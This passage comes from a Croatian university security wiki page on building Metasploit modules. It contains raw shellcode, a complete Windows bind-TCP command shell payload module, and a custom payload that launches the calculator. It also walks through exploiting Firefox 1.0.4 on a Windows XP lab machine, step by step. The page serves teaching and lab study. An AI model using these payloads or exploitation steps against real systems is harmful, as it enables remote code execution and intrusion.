+  0xe8, 0xe5, 0xff, 0xff, 0xff, 0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65,
+  0x20, 0x2f, 0x63, 0x20, 0x6e, 0x6f, 0x74, 0x65, 0x70, 0x61, 0x64, 0x00
+</pre>
+<p><br />
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Krudjuras&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Krudjuras (stranica ne postoji)">Krudjuras</a> 14:05, 19. siječnja 2013. (CET)
+</p>
+<h2> <span class="mw-headline" id="Prakti.C4.8Dni_dio_-_primjer_izrade_payloada">Praktični dio - primjer izrade payloada</span></h2>
+<p>Kod na kojemu će se temeljiti novi payload je sljedeći
+</p>
+<pre>
+require 'msf/core'
+require 'msf/core/handler/bind_tcp'
+require 'msf/base/sessions/command_shell'
+require 'msf/base/sessions/command_shell_options'
+
+module Metasploit3
+
+	include Msf::Payload::Windows
+	include Msf::Payload::Single
+	include Msf::Sessions::CommandShellOptions
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'          =&gt; 'Windows Command Shell, Bind TCP Inline',
+			'Version'       =&gt; '$Revision$',
+			'Description'   =&gt; 'Listen for a connection and spawn a command shell',
+			'Author'        =&gt; [ 'vlad902', 'sf' ],
+			'License'       =&gt; MSF_LICENSE,
+			'Platform'      =&gt; 'win',
+			'Arch'          =&gt; ARCH_X86,
+			'Handler'       =&gt; Msf::Handler::BindTcp,
+			'Session'       =&gt; Msf::Sessions::CommandShell,
+			'Payload'       =&gt;
+				{
+					'Offsets' =&gt;
+						{
+							'LPORT'    =&gt; [ 201, 'n' ],
+							'EXITFUNC' =&gt; [ 311, 'V' ],
+						},
+					'Payload' =&gt;
+						&quot;\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B&quot; +
+						&quot;\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0&quot; +
+						&quot;\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57&quot; +
+						&quot;\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01&quot; +
+						&quot;\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B&quot; +
+						&quot;\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4&quot; +
+						&quot;\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B&quot; +
+						&quot;\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24&quot; +
+						&quot;\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D&quot; +
+						&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07&quot; +
+						&quot;\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00&quot; +
+						&quot;\xFF\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF&quot; +
+						&quot;\xD5\x89\xC7\x31\xDB\x53\x68\x02\x00\x11\x5C\x89\xE6\x6A\x10\x56&quot; +
+						&quot;\x57\x68\xC2\xDB\x37\x67\xFF\xD5\x53\x57\x68\xB7\xE9\x38\xFF\xFF&quot; +
+						&quot;\xD5\x53\x53\x57\x68\x74\xEC\x3B\xE1\xFF\xD5\x57\x89\xC7\x68\x75&quot; +
+						&quot;\x6E\x4D\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31&quot; +
+						&quot;\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44&quot; +
+						&quot;\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53&quot; +
+						&quot;\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x4E\x56\x46\xFF\x30\x68&quot; +
+						&quot;\x08\x87\x1D\x60\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x68\xA6\x95\xBD\x9D&quot; +
+						&quot;\xFF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F&quot; +
+						&quot;\x6A\x00\x53\xFF\xD5&quot;
+				}
+			))
+	end
+
+end
+</pre>
+<p>Izradit ćemo payload koji kod izvršenja pokreće novu instancu kalkulator aplikacije na Windowsima XP SP3.
+Za to je iskorišten shellcode sa sljedeće Web stranice: <a href="http://www.shell-storm.org/shellcode/shellcode-windows.php" class="external free" rel="nofollow">http://www.shell-storm.org/shellcode/shellcode-windows.php</a>
+</p><p>Konačni sadržaj kreiranog modula je sljedeći
+</p>
+<pre>
+require 'msf/core'
+require 'msf/core/payload/windows/exec'
+
+
+module Metasploit3
+
+	include Msf::Payload::Windows
+	include Msf::Payload::Single
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'          =&gt; 'SIS - projekt - Spawn calc',
+			'Version'       =&gt; '$Revision$',
+			'Description'   =&gt; 'SIS - projekt - Spawn calc',
+			'Author'        =&gt; [ 'Krunoslav Đuras' ],
+			'License'       =&gt; BSD_LICENSE,
+			'Platform'      =&gt; 'win',
+			'Arch'          =&gt; ARCH_X86,
+			'Privileged'    =&gt; false,
+			'Payload'       =&gt;
+			{
+				'Offsets' =&gt; { },
+				'Payload' =&gt;	        
+				  &quot;\x31\xC9&quot; +
+				  &quot;\x51&quot; +
+				  &quot;\x68\x63\x61\x6C\x63&quot; +
+				  &quot;\x54&quot; +
+				  &quot;\xB8\xC7\x93\xC2\x77&quot; +
+				  &quot;\xFF\xD0&quot;  
+			}
+			))
+
+		# EXITFUNC is not supported&#160;:/
+		deregister_options('EXITFUNC')
+	end
+
+end
+</pre>
+<p>Kada sada odaberemo ovaj modul kao payload kod exploitacije računala, kod uspješne exploitacije će se kreirati novi proces windows kalkulatora.
+</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Krudjuras&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Krudjuras (stranica ne postoji)">Krudjuras</a> 11:53, 19. siječnja 2013. (CET)
+</p>
+<h2> <span class="mw-headline" id="Prakti.C4.8Dni_dio_-_primjer_exploitacije_ranjivog_ra.C4.8Dunala">Praktični dio - primjer exploitacije ranjivog računala</span></h2>
+<p>U sljedećem primjeru prikazana je exploitacija računala sa instaliranim Windows XP SP3 operacijskim sustavom i Firefox 1.0.4. browsera sa sigurnosnim propustom.
+</p><p>Za payload je korišten prethodno kreiran modul koji kod izvršenja pokreće Windows calc aplikaciju.
+</p><p>Prvo se mora pokrenuti msfconsole upisom naredbe
+</p>
+<pre>
+msfconsole
+</pre>
+<p>u linux terminal.
+</p><p>Nakon toga odabire se eksploit koji će se koristiti. Mi smo se odlučili za exploit koji iskorištava ranjivost Firefox btowsera verzije 1.0.4. Da bismo odabrali taj exploit u msfconsole moramo upisati naredbu
+</p>
+<pre>
+use exploit/multi/browser/mozilla_compareto
+</pre>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Exploiting_1.png" class="image"><img alt="Exploiting 1.png" src="../images/thumb/9/91/Exploiting_1.png/600px-Exploiting_1.png" width="600" height="372" /></a></div></div>
+<p>Općenito se nakon odabira exploita može provjeriti da li on se može iskoristiti. Za to se koristi naredba check. Neki exploitovi ne podržavaju provjeru, pa tako i odabrani exploit ne podržava provjeru ranjivosti.
+</p><p>Nakon toga odabiremo payload pomoću naredbe
+</p>
+<pre>
+set payload windows/spawncalc
+</pre>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Exploiting_2.png" class="image"><img alt="Exploiting 2.png" src="../images/thumb/7/77/Exploiting_2.png/600px-Exploiting_2.png" width="600" height="372" /></a></div></div>
+<p>Time smo odabrali payload koji smo sami kreirali i stavili u za to namjenjen direktorij MSF-a.
+</p><p>Nakon toga se podešavaju opcije za exploit i payload. Naš payload nema dodatnih parametara, pa možemo pomoću naredbe
+</p>
+<pre>
+show options
+</pre>
+<p>vidjeti koje parametre exploita možemo podesiti.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Exploiting_3.png" class="image"><img alt="Exploiting 3.png" src="../images/thumb/c/ce/Exploiting_3.png/600px-Exploiting_3.png" width="600" height="372" /></a></div></div>
+<p><br />
+Nakon toga postavljamo port na kojem će bit dostupan exploit
+</p>
+<pre>
+set SRVPORT 7673
+</pre>
+<p>Sa naredbom
+</p>
+<pre>
+exploit
+</pre>
+<p>se pokreće exploit.
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Exploiting_4.png" class="image"><img alt="Exploiting 4.png" src="../images/thumb/d/db/Exploiting_4.png/600px-Exploiting_4.png" width="600" height="372" /></a></div></div>
+<p>Sada smo dobili link koji mora otvoriti ranjivi Firefox kako bi se izvršio payload, u ovom slučaju ta adresa je
+</p>
+<pre>
+http://192.168.1.249:7673/9ihDnSJ8bri
+</pre>
+<p>Ranjivo računalo pokrenuto u VirtualBoxu prikazano je na sljedećoj slici
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Exploiting_5.png" class="image"><img alt="Exploiting 5.png" src="../images/thumb/b/b3/Exploiting_5.png/600px-Exploiting_5.png" width="600" height="333" /></a></div></div>
+<p>Otvaranjem dobivenog linka u ranjivom Firefoxu iskorištava se sigurnosni propust te se aktivira payload koji smo kreirali - pokreće se calc.exe
+</p>
+<div class="center"><div class="floatnone"><a href="http://security.foi.hr/wiki/index.php/Datoteka:Exploiting_6.png" class="image"><img alt="Exploiting 6.png" src="../images/thumb/d/de/Exploiting_6.png/600px-Exploiting_6.png" width="600" height="332" /></a></div></div>
+<p><br />
+--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Krudjuras&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Krudjuras (stranica ne postoji)">Krudjuras</a> 13:17, 19. siječnja 2013. (CET)
+</p>
+<h2> <span class="mw-headline" id="Literatura">Literatura</span></h2>
+<ol>
+<li><a href="https://media.defcon.org/dc-19/presentations/Carey/DEFCON-19-Carey-Metasploit-vSploit-Modules.pdf" class="external free" rel="nofollow">https://media.defcon.org/dc-19/presentations/Carey/DEFCON-19-Carey-Metasploit-vSploit-Modules.pdf</a></li>
+<li><a href="http://www.fishnetsecurity.com/6labs/blog/scripting-metasploit-python" class="external free" rel="nofollow">http://www.fishnetsecurity.com/6labs/blog/scripting-metasploit-python</a></li>
+<li><a href="http://en.wikibooks.org/wiki/Metasploit/MeterpreterClient" class="external free" rel="nofollow">http://en.wikibooks.org/wiki/Metasploit/MeterpreterClient</a></li>
+<li><a href="http://www.darkoperator.com/blog/2010/5/26/setting-up-rvm-and-irb-for-metasploit-development-in-backtra.html" class="external free" rel="nofollow">http://www.darkoperator.com/blog/2010/5/26/setting-up-rvm-and-irb-for-metasploit-development-in-backtra.html</a></li>
+<li><a href="https://github.com/rapid7/metasploit-framework/wiki/Metasploit-Development-Environment" class="external free" rel="nofollow">https://github.com/rapid7/metasploit-framework/wiki/Metasploit-Development-Environment</a></li>
+<li><a href="https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/" class="external free" rel="nofollow">https://www.corelan.be/index.php/2009/08/12/exploit-writing-tutorials-part-4-from-exploit-to-metasploit-the-basics/</a></li>
+<li><a href="http://dev.metasploit.com/redmine/projects/framework/wiki/DeveloperGuide" class="external free" rel="nofollow">http://dev.metasploit.com/redmine/projects/framework/wiki/DeveloperGuide</a></li>
+<li><a href="http://www.securityhunk.com/2010/11/metasploit-guide-for-beginners-and.html" class="external free" rel="nofollow">http://www.securityhunk.com/2010/11/metasploit-guide-for-beginners-and.html</a></li>
+<li><a href="http://www.offensive-security.com/metasploit-unleashed/Metasploit_Architecture" class="external free" rel="nofollow">http://www.offensive-security.com/metasploit-unleashed/Metasploit_Architecture</a></li>
+<li><a href="http://dev.metasploit.com/documents/users_guide.pdf" class="external free" rel="nofollow">http://dev.metasploit.com/documents/users_guide.pdf</a></li>
+<li><a href="http://securityblog.gr/1042/metasploit-interfaces-part-2/" class="external free" rel="nofollow">http://securityblog.gr/1042/metasploit-interfaces-part-2/</a></li>
+<li><a href="http://www.linuxforu.com/2010/10/metasploit-exploit-framework-for-penetration-testers/" class="external free" rel="nofollow">http://www.linuxforu.com/2010/10/metasploit-exploit-framework-for-penetration-testers/</a></li>
+<li><a href="http://projectshellcode.com/?q=node/12" class="external free" rel="nofollow">http://projectshellcode.com/?q=node/12</a></li>
+<li><a href="http://www.shell-storm.org/shellcode/shellcode-windows.php" class="external free" rel="nofollow">http://www.shell-storm.org/shellcode/shellcode-windows.php</a></li>
+</ol>
+
+<!-- 
+NewPP limit report
+Preprocessor node count: 345/1000000
+Post-expand include size: 0/2097152 bytes
+Template argument size: 0/2097152 bytes
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key sisds:pcache:idhash:4405-0!*!0!!hr!2!edit=0 and timestamp 20190203204040 -->
+<div class="printfooter">
+Dobavljeno iz "<a href="Metasploit_framework_i_izrada_modula_za_MSF.html">http://security.foi.hr/wiki/index.php/Metasploit_framework_i_izrada_modula_za_MSF</a>"</div>
+				<!-- /bodytext -->
+								<!-- catlinks -->
+				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
+												<div class="visualClear"></div>
+			</div>
+			<!-- /bodyContent -->
+		</div>
+		<!-- /content -->
+		<!-- header -->
+		<div id="mw-head" class="noprint">
+			
+<!-- 0 -->
+<div id="p-personal" class="">
+	<h5>Osobni alati</h5>
+	<ul>
+					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Metasploit_framework_i_izrada_modula_za_MSF" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+			<div id="left-navigation">
+				
+<!-- 0 -->
+<div id="p-namespaces" class="vectorTabs">
+	<h5>Imenski prostori</h5>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="Metasploit_framework_i_izrada_modula_za_MSF.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
+					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Metasploit_framework_i_izrada_modula_za_MSF&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-variants" class="vectorMenu emptyPortlet">
+		<h5><span>Inačice</span><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+			</div>
+			<div id="right-navigation">
+				
+<!-- 0 -->
+<div id="p-views" class="vectorTabs">
+	<h5>Pogledi</h5>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="Metasploit_framework_i_izrada_modula_za_MSF.html" >Čitaj</a></span></li>
+					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Metasploit_framework_i_izrada_modula_za_MSF&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
+					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Metasploit_framework_i_izrada_modula_za_MSF&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
+			</ul>
+</div>
+
+<!-- /0 -->
+
+<!-- 1 -->
+<div id="p-cactions" class="vectorMenu emptyPortlet">
+	<h5><span>Radnje</span><a href="Metasploit_framework_i_izrada_modula_za_MSF.html#"></a></h5>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+
+<!-- /1 -->
+
+<!-- 2 -->
+<div id="p-search">
+	<h5><label for="searchInput">Traži</label></h5>
+	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
+		<input type='hidden' name="title" value="Posebno:Traži"/>
+				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
+		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
+		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
+			</form>
+</div>
+
+<!-- /2 -->
+			</div>
+		</div>
+		<!-- /header -->
+		<!-- panel -->
+			<div id="mw-panel" class="noprint">
+				<!-- logo -->
+					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
+				<!-- /logo -->
+				
+<!-- navigation -->
+<div class="portal" id='p-navigation'>
+	<h5>Orijentacija</h5>
+	<div class="body">
+				<ul>
+					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
+					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
+					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
+					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
+					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
+					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
+				</ul>
+			</div>
+</div>
+
+<!-- /navigation -->
+
+<!-- SEARCH -->
+
+<!-- /SEARCH -->
+
+<!-- TOOLBOX -->
+<div class="portal" id="p-tb">
+	<h5>Traka s alatima</h5>
+	<div class="body">
+		<ul>
+					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Metasploit_framework_i_izrada_modula_za_MSF" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
+						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Metasploit_framework_i_izrada_modula_za_MSF" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
+																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
+									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Metasploit_framework_i_izrada_modula_za_MSF&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
+						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Metasploit_framework_i_izrada_modula_za_MSF&amp;oldid=17313" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
+						</ul>
+	</div>
+</div>
+
+<!-- /TOOLBOX -->
+
+<!-- LANGUAGES -->
+
+<!-- /LANGUAGES -->
+			</div>
+		<!-- /panel -->
+		<!-- footer -->
+		<div id="footer">
+											<ul id="footer-info">
+																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 03:27, 22. siječnja 2013.</li>
+																							<li id="footer-info-viewcount">Ova stranica je pogledana 44.657 puta.</li>
+																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
+															</ul>
+															<ul id="footer-places">
+																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
+																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
+																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
+															</ul>
+											<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<!-- /footer -->
+		
+<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Metasploit_framework_i_izrada_modula_za_MSF", "wgTitle": "Metasploit framework i izrada modula za MSF", "wgAction": "view", "wgArticleId": 4405, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 17313, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script>		<!-- fixalpha -->
+		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
+		<!-- /fixalpha -->
+		<!-- Served in 0.474 secs. -->			</body>
+</html>
